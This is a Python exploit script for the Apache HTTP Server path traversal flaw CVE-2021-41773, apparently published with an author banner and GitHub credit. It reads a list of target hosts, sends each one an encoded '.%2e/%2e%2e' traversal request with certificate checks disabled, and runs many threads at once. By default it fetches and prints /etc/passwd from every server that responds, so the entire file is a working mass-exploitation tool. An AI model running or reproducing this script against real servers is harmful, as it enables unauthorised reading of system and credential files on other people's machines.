import argparse
import requests, os
import concurrent.futures
import urllib3
from colorama import Fore
from sys import stdout

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def exploit_path_traversal(host, target_path):
    if not host.startswith('http://') and not host.startswith('https://'):
        host = 'https://' + host
    
    payload_url = f"{host}/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e{target_path}"
    try:
        response = requests.get(payload_url, verify=False)
        if response.status_code == 200:
            print()
            print(f"{Fore.YELLOW}[Apache]: {Fore.WHITE}{host} {Fore.RED}| {Fore.GREEN}[w00t!]")
            print(response.text)
            print(Fore.MAGENTA + "=" * 120)
        else:
            print(f"{Fore.YELLOW}[Apache]: {Fore.WHITE}{host} {Fore.RED}| [Failed!]")
    except requests.exceptions.RequestException as e:
        print(f"{Fore.YELLOW}[Apache]: {Fore.WHITE}{host} {Fore.RED}| [Invalid!]")

def exploit_targets(targets_file, target_path, num_threads):
    try:
        with open(targets_file, 'r') as f:
            targets = f.readlines()
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=num_threads) as executor:
            futures = {executor.submit(exploit_path_traversal, host.strip(), target_path): host.strip() for host in targets if host.strip()}

            for future in concurrent.futures.as_completed(futures):
                host = futures[future]
                try:
                    future.result()
                except Exception as e:
                    print(f"{Fore.YELLOW}[Apache]: {Fore.WHITE}{payload_url} {Fore.RED}| [Invalid!]")

    except FileNotFoundError:
        print(f"[-] The file '{targets_file}' was not found.")
    except Exception as e:
        print(f"[-] An error occurred: {e}")

def main():
    parser = argparse.ArgumentParser(description='Exploit Apache HTTP Server Path Traversal (CVE-2021-41773)')
    parser.add_argument('-f', '--file', required=True, help='File containing the list of target URLs/IPs')
    parser.add_argument('-p', '--path', default='/etc/passwd', help='Path to access (default: /etc/passwd)')
    parser.add_argument('-t', '--thread', type=int, default=5, help='Number of threads to use (default: 5)')

    args = parser.parse_args()

    exploit_targets(args.file, args.path, args.thread)

if __name__ == "__main__":
    os.system('clear' if os.name == 'posix' else 'cls')
    stdout.write("                                                                                         \n")
    stdout.write(""+Fore.LIGHTRED_EX +" █████  ██████   █████   ██████ ██   ██ ███████       ██████  ████████ \n")
    stdout.write(""+Fore.LIGHTRED_EX +"██   ██ ██   ██ ██   ██ ██      ██   ██ ██            ██   ██    ██    \n")
    stdout.write(""+Fore.LIGHTRED_EX +"███████ ██████  ███████ ██      ███████ █████   █████ ██████     ██    \n")
    stdout.write(""+Fore.LIGHTRED_EX +"██   ██ ██      ██   ██ ██      ██   ██ ██            ██         ██    \n")
    stdout.write(""+Fore.LIGHTRED_EX +"██   ██ ██      ██   ██  ██████ ██   ██ ███████       ██         ██    \n")
    stdout.write(""+Fore.YELLOW +"═════════════╦═════════════════════════════════╦═══════════════════════════════════════\n")
    stdout.write(""+Fore.YELLOW   +"╔════════════╩═════════════════════════════════╩═════════════════════════════╗\n")
    stdout.write(""+Fore.YELLOW   +"║ \x1b[38;2;255;20;147m• "+Fore.GREEN+"AUTHOR             "+Fore.RED+"    |"+Fore.LIGHTWHITE_EX+"   PARI MALAM                                    "+Fore.YELLOW+"║\n")
    stdout.write(""+Fore.YELLOW   +"╔════════════════════════════════════════════════════════════════════════════╝\n")
    stdout.write(""+Fore.YELLOW   +"║ \x1b[38;2;255;20;147m• "+Fore.GREEN+"GITHUB             "+Fore.RED+"    |"+Fore.LIGHTWHITE_EX+"   GITHUB.COM/THATNOTEASY                        "+Fore.YELLOW+"║\n")
    stdout.write(""+Fore.YELLOW   +"╚════════════════════════════════════════════════════════════════════════════╝\n") 
    print(f"{Fore.YELLOW}[CVE-2021-41773] - {Fore.GREEN}Apachhe HTTP Server Path Traversal!")
    main()
